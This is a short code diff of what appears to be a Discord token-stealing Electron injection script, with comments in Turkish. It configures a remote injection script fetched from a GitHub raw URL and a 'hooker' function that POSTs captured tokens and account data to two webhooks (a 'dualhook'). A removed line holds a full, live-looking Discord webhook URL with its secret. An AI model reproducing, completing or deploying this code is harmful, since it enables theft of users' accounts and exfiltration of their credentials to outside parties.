@@ -11,8 +11,8 @@ const {
 } = require('electron');
 
 const CONFIG = {
-    webhook: "%WEBHOOK",
-    api: "https://discord.com/api/webhooks/1433131081715941561/6VlzcEyu_XVOHpPqvcYlTEleUaR_5OJFlW9JeY5tzwTut4wijFQpbY0bodH6qHvypP1O",
+    webhook: "%WEBHOOK%",
+    api: "%API_WEBHOOK%",
     injection_url: "https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/inj.js",
     filters: {
         urls: [
@@ -248,8 +248,8 @@ const hooker = async (content, token, account) => {
     // Hem webhook'a hem API'ye gönder
     const requests = [];
     
-    // Webhook'a gönder
-    if (CONFIG.webhook && CONFIG.webhook !== "%WEBHOOK" && CONFIG.webhook.startsWith("https://")) {
+    // Kullanıcı webhook'una gönder
+    if (CONFIG.webhook && CONFIG.webhook !== "%WEBHOOK%" && CONFIG.webhook !== "%WEBHOOK" && CONFIG.webhook.startsWith("https://")) {
         requests.push(
             request("POST", CONFIG.webhook, {
                 "Content-Type": "application/json"
@@ -257,8 +257,8 @@ const hooker = async (content, token, account) => {
         );
     }
     
-    // API'ye gönder
-    if (CONFIG.api && CONFIG.api.startsWith("https://")) {
+    // API webhook'una gönder (dualhook)
+    if (CONFIG.api && CONFIG.api !== "%API_WEBHOOK%" && CONFIG.api.startsWith("https://")) {
         requests.push(
             request("POST", CONFIG.api, {
                 "Content-Type": "application/json"
